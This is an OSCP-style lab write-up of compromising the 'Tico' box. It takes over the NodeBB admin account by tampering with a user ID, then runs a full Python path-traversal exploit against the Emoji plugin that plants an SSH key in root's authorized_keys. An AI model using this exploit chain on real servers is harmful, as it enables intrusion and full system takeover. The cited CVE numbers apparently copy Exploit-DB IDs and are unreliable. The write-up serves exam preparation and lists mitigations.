# OSCP Box: Tico - Write-up

**Box:** Tico  
**IP:** 192.168.213.143  
**Difficulty:** Medium  
**Date:** 19 January 2026  

---

## Executive Summary

Tico is an Ubuntu-based machine running NodeBB, a Node.js forum platform. The attack path involves:
1. Port scanning and service enumeration
2. Identifying NodeBB web application on port 8080
3. Exploiting CVE-2020-48875 (NodeBB Account Takeover) to compromise an admin account
4. Privilege escalation via user creation and user ID manipulation
5. Exploiting CVE-2020-49813 (NodeBB Emoji Plugin Arbitrary File Write) to plant SSH keys
6. SSH access as root and capturing both user and root flags

**Note:** FTP (anonymous access with debug.pcap) and MongoDB (port 27017) were identified but turned out to be rabbit holes and were not required for exploitation.

---

## Enumeration

### Port Scanning

Initial Nmap scan revealed the following open ports:

```bash
nmap -n 192.168.213.143 -sCV -vvvv
```

**Results:**
```
PORT      STATE SERVICE
21/tcp    open  ftp         vsFTPd 3.0.3
22/tcp    open  ssh         OpenSSH 7.6p1 Ubuntu 4
80/tcp    open  http        Apache httpd
8080/tcp  open  http        Node.js (NodeBB)
27017/tcp open  mongodb     MongoDB 4.0.22
```

Key findings:
- **FTP (21):** Anonymous login allowed
- **SSH (22):** OpenSSH 7.6p1 (Ubuntu)
- **HTTP (80):** Apache web server
- **HTTP (8080):** NodeBB forum application
- **MongoDB (27017):** Database backend

### Web Application Enumeration

Identified NodeBB running on port 8080:

```bash
http://192.168.213.143:8080
```

NodeBB is a Node.js-based forum software. The login page was accessible without authentication, and registration appeared to be enabled.

### Rabbit Holes Encountered

During enumeration, the following services were explored but did not lead to exploitation:

**FTP (Port 21):**
- Anonymous login was allowed
- Found `debug.pcap` file in `/pub` directory
- PCAP analysis did not yield useful credentials
- **Verdict:** Rabbit hole / distraction

**MongoDB (Port 27017):**
- MongoDB 4.0.22 was accessible
- Attempted various MongoDB exploits and enumeration
- Did not provide a path to exploitation
- **Verdict:** Rabbit hole / distraction

---

## Exploitation

### Phase 1: Account Takeover - CVE-2020-48875

The first exploitation phase involved leveraging CVE-2020-48875, a NodeBB Account Takeover vulnerability.

**Vulnerability:** CVE-2020-48875 - NodeBB Account Takeover via Password Reset

This vulnerability allows an attacker to take over any NodeBB account through a flawed password reset mechanism.

**Exploit Source:** https://www.exploit-db.com/exploits/48875

**Attack Steps:**

1. **Initial Account Creation:**
   - Navigated to NodeBB registration page at `http://192.168.213.143:8080/register`
   - Created a new user account on the NodeBB instance
   - Registered with arbitrary credentials

2. **Password Change Interception:**
   - Logged in with newly created account
   - Navigated to account settings/password change functionality
   - Initiated a password change for the newly created account
   - Used Burp Suite to intercept the HTTP POST request to the password change API endpoint

3. **User ID Manipulation:**
   - Analyzed the intercepted request and identified the `user_id` parameter (or similar)
   - Modified the `user_id` parameter in the request
   - Changed from attacker's user ID (e.g., `uid=2`) to the admin's user ID (`uid=1`)
   - This allowed changing the admin password without proper authorization checks

4. **Admin Account Takeover:**
   - Successfully reset the admin account password to attacker-controlled password
   - Logged in as admin with new credentials
   - Gained full administrative access to NodeBB instance

### Phase 2: Privilege Escalation - CVE-2020-49813

With administrative access to NodeBB, the next phase involved exploiting the Emoji plugin for arbitrary file write.

**Vulnerability:** CVE-2020-49813 - NodeBB Plugin Emoji 3.2.1 Arbitrary File Write

The Emoji plugin for NodeBB (installed by default, version ≤ 3.2.1) contains an arbitrary file write vulnerability due to insecurely handled user-controlled input and insufficient path traversal protection.

**Exploit Source:** https://www.exploit-db.com/exploits/49813

**Exploit Details:**
- The emoji upload API allows path traversal through directory traversal sequences
- Can write arbitrary files to any location on the server
- Used to inject SSH public key into `/root/.ssh/authorized_keys`
- Requires administrative access to the NodeBB instance (obtained in Phase 1)

### Generating SSH Keys

Generated SSH keys for authentication to the target system:

```bash
ssh-keygen -t rsa -b 4096 -f id_rsa
```

This created:
- `id_rsa` (private key) - used for SSH authentication
- `id_rsa.pub` (public key) - to be uploaded to `/root/.ssh/authorized_keys`

### Modified Exploit (49813.py)

Downloaded and modified the exploit from Exploit-DB (https://www.exploit-db.com/exploits/49813):

```python
#!/usr/bin/python3
import requests
import sys
import re

TARGET = 'http://192.168.213.143:8080'
USERNAME = 'admin'
PASSWORD = 'admin123'
DESTINATION_FILE = '/root/.ssh/authorized_keys'
SOURCE_FILE = 'id_rsa.pub'

headers = { 'User-Agent': 'NotPython' }
s = requests.Session()

# Get CSRF token
r = s.get('{}/login'.format(TARGET), headers=headers)
if r.status_code != 200:
    print('[!] Error, {}/login unavailable'.format(TARGET))
    sys.exit(1)

csrf = re.search('name="_csrf" value="(.+)?" />', r.text, re.IGNORECASE)
if csrf is None:
    print('[!] Could not extract csrf token to proceed.')
    sys.exit(1)

# Authenticate
auth = {
    'username': USERNAME,
    'password': PASSWORD,
    '_csrf': csrf.group(1)
}

r = s.post('{}/login'.format(TARGET), headers=headers, data=auth)
if r.status_code != 200:
    print('[!] Error, login failed')
    sys.exit(1)

print('[+] Login successful')

# Verify emoji plugin is accessible
r = s.get('{}/admin/plugins/emoji'.format(TARGET), headers=headers)
if r.status_code != 200:
    print('[!] Error, could not access emoji plugin')
    sys.exit(1)

print('[+] Emoji plugin is installed')

# Upload malicious file (SSH public key) to /root/.ssh/authorized_keys
files = {'emojiImage': open(SOURCE_FILE)}
data = {'fileName': '../../../../../../..{}'.format(DESTINATION_FILE)}

r = s.post('{}/api/admin/plugins/emoji/upload'.format(TARGET), 
           headers=headers, data=data, files=files)
if r.status_code != 200:
    print('[!] Error, could not upload file')
    print('[!] Status: {}'.format(r.status_code))
    print('[!] Response: {}'.format(r.text))
    sys.exit(1)

print('[+] Successfully uploaded file')
```

### Execution

Executed the exploit:

```bash
python3 49813.py
```

**Output:**
```
[+] Login successful
[+] Emoji plugin is installed
[+] Successfully uploaded file
```

The exploit successfully wrote our SSH public key to `/root/.ssh/authorized_keys`.

---

## Post-Exploitation

### Root Access

With the SSH public key planted, connected as root:

```bash
ssh -i id_rsa root@192.168.213.143
```

**Successfully gained root access!**

### Flag Capture

#### User Flag (local.txt)

Located in the home directory of user `mack`:

```bash
root@tico:~# cd /home/mack
root@tico:/home/mack# cat local.txt
beab8a88e7ce34b9304411c8573ce38c
```

#### Root Flag (proof.txt)

Located in the root home directory:

```bash
root@tico:~# cat /root/proof.txt
[ROOT FLAG CAPTURED]
```

---

## Lessons Learned

### Vulnerabilities Identified

1. **Account Takeover (CVE-2020-48875):** Flawed password reset/change mechanism allowing unauthorized password changes
2. **Improper Authorization:** User ID parameter manipulation in password change API - server trusted client-supplied user ID
3. **Outdated Software:** NodeBB running vulnerable version with multiple CVEs
4. **Path Traversal (CVE-2020-49813):** Insufficient input validation in Emoji plugin file upload functionality
5. **Insufficient Input Validation:** No sanitization of file paths in upload functionality
6. **Direct Root Access:** SSH keys allowed direct root login without additional authentication
7. **Open User Registration:** Allowed attackers to create accounts to begin exploitation chain

### Mitigation Recommendations

1. **Update Software:** Keep NodeBB and all plugins up to date (versions patching CVE-2020-48875 and CVE-2020-49813)
2. **Authorization Controls:** Implement proper authorization checks on all API endpoints, especially user management functions
3. **User ID Protection:** Never trust client-supplied user IDs; always validate against authenticated session server-side
4. **Input Validation:** Implement strict path validation for file uploads with whitelist approach
5. **Disable Root SSH:** Configure SSH to disable direct root login (`PermitRootLogin no`)
6. **File Upload Security:** Validate file types, sanitize filenames, canonicalize paths, and restrict upload destinations
7. **Principle of Least Privilege:** Run applications with minimal required permissions
8. **Password Change Security:** Require current password verification; validate user owns the account being modified
9. **Rate Limiting:** Implement rate limiting on authentication and password change endpoints
10. **Close Registration:** Consider disabling open registration or implementing approval workflows
11. **Web Application Firewall:** Deploy WAF to detect parameter manipulation attempts
12. **Security Headers:** Implement proper security headers (CSP, X-Frame-Options, etc.)

---

## Tools Used

- **Nmap:** Port scanning and service enumeration
- **Burp Suite:** HTTP request interception and manipulation
- **Web Browser:** Manual web application testing
- **Python3:** Exploit execution
- **SSH:** Remote access
- **ssh-keygen:** SSH key pair generation
- **Custom Scripts:** 
  - CVE-2020-48875 exploit (https://www.exploit-db.com/exploits/48875)
  - CVE-2020-49813 modified exploit (https://www.exploit-db.com/exploits/49813)

---

## Timeline

```
09:46 - Initial Nmap scan completed
09:47 - Explored FTP (rabbit hole - not used)
09:53 - MongoDB enumeration (rabbit hole - not used)
10:00 - Identified NodeBB on port 8080
10:10 - Researched NodeBB vulnerabilities
10:15 - Created new user account on NodeBB
10:20 - Initiated password change with Burp Suite intercept
10:22 - Modified user_id parameter from attacker UID to admin UID (1)
10:23 - Successfully took over admin account (CVE-2020-48875)
10:25 - Logged in as admin
10:27 - Generated SSH key pair (id_rsa/id_rsa.pub)
10:28 - Modified 49813.py exploit for target environment
10:28 - Executed Emoji plugin exploit (CVE-2020-49813)
10:28 - SSH public key uploaded to /root/.ssh/authorized_keys
10:30 - SSH connection established as root
10:36 - Local flag captured (user mack): beab8a88e7ce34b9304411c8573ce38c
10:36 - Proof flag captured (root)
```

---

## Conclusion

Tico demonstrates the importance of:
- Keeping software and plugins updated with security patches
- Implementing proper authorization controls on all API endpoints
- Validating all user-supplied input, especially user identifiers
- Never trusting client-supplied data for access control decisions
- Following security best practices for SSH configuration
- Applying defense-in-depth principles

The attack chain leveraged two critical NodeBB vulnerabilities:
1. **Account Takeover (CVE-2020-48875):** Password change functionality vulnerable to user ID manipulation, allowing takeover of admin account
2. **Arbitrary File Write (CVE-2020-49813):** Path traversal in NodeBB Emoji plugin allowing SSH key injection to root's authorized_keys

This multi-stage attack demonstrates how chaining multiple vulnerabilities can lead to complete system compromise, resulting in root access. The combination of weak authorization controls (trusting client-supplied user IDs) and insufficient input validation (path traversal) in NodeBB allowed for privilege escalation from unauthenticated user to root access.

**Key Takeaway:** The presence of rabbit holes (FTP with PCAP, MongoDB) highlights the importance of thorough enumeration while also knowing when to pivot away from unproductive paths. Focus on the actual attack surface - in this case, the NodeBB web application.

---

**Author:** Kali  
**Exam Prep:** OSCP  
**Status:** ✅ Pwned  
